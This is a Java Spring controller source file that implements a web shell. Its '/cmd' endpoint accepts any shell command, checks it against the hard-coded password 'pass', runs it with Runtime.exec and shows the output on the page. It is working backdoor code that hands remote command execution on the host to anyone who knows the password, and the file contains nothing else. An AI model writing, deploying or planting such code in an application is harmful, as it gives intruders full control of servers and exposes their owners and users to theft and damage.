package com.controller;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

@Controller
public class IndexController {

    private Process p = null;
    private Runtime runtime = null;

    @RequestMapping("/cmd")
    public String command(String pwd, String cmd, Model model){

        String output = "";
        if(cmd!=null&&pwd!=null){

            if(pwd.trim().equals( "pass")) {

                StringBuilder buffer = new StringBuilder();

                if (runtime == null) {
                    runtime = Runtime.getRuntime();
                }
                try {
                    p = runtime.exec(cmd);
                    p.waitFor();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

                    String line = "";
                    while ((line = reader.readLine()) != null) {
                        buffer.append(line + "\r\n");
                    }

                    output = buffer.toString();
                }catch (IOException e){
                    model.addAttribute("error",e.getMessage());
                }catch (InterruptedException e) {
                    model.addAttribute("error",e.getMessage());
                }

            }else{
                model.addAttribute("error","pass error");
            }
            model.addAttribute("command",cmd);
            model.addAttribute("pwd",pwd);
            model.addAttribute("output",output);

        }
        return "index";
    }

}
